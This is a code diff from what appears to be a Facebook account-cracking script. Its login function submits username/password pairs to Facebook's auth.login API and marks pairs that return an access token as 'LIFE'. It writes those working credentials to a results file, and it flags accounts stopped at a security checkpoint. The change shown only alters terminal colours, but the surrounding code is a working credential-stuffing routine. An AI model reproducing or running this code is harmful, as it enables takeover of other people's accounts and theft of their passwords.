@@ -71,7 +71,7 @@ def login(username,password,cek=False):
         api = 'https://b-api.facebook.com/method/auth.login'
         response = requests.get(api, params=params)
         if 'EAA' in response.text:
-                print(f"\r[\033[1;91mLIFE\033[0m] {username} => {password}                    ",end="")
+                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                    ",end="")
                 print()
                 result += 1
                 if cek:
@@ -80,7 +80,7 @@ def login(username,password,cek=False):
                         with open('results-life.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
         elif 'www.facebook.com' in response.json()['error_msg']:
-                print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
+                print(f"\r[\033[1;31mCHEK\033[0m] {username} => {password}                    ",end="")
                 print()
                 check += 1
                 if cek:
